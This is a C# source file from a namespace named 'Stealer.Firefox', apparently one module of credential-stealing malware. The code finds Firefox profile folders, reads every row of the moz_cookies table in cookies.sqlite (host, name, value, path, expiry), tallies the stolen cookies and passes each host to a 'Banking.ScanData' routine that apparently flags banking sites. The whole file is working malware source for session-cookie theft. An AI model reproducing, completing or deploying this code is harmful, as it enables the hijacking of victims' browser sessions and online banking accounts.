using System;
using System.IO;
using System.Collections.Generic;

namespace Stealer.Firefox
{
    internal sealed class cCookies
    {
        // Get cookies.sqlite file location
        private static string GetCookiesDBPath(string path)
        {
            try
            {
                string dir = path + "\\Profiles";
                if (Directory.Exists(dir))
                    foreach (string sDir in Directory.GetDirectories(dir))
                        if (File.Exists(sDir + "\\cookies.sqlite"))
                            return sDir + "\\cookies.sqlite";
            } catch { }
            return null;
        }

        // Get cookies from gecko browser
        public static List<Cookie> Get(string path)
        {
            List<Cookie> lcCookies = new List<Cookie>();
            try
            {
                string sCookiePath = GetCookiesDBPath(path);

                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sCookiePath, "moz_cookies");
                if (sSQLite == null)
                    return lcCookies;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    Cookie cCookie = new Cookie();
                    cCookie.sHostKey = sSQLite.GetValue(i, 4);
                    cCookie.sName = sSQLite.GetValue(i, 2);
                    cCookie.sValue = sSQLite.GetValue(i, 3);
                    cCookie.sPath = sSQLite.GetValue(i, 5);
                    cCookie.sExpiresUtc = sSQLite.GetValue(i, 6);

                    // Analyze value
                    Banking.ScanData(cCookie.sHostKey);
                    Counter.Cookies++;
                    lcCookies.Add(cCookie);
                }

                return lcCookies;
            }
            catch (Exception ex) { Console.WriteLine(ex); }
            return new List<Cookie>();
        }

    }
}
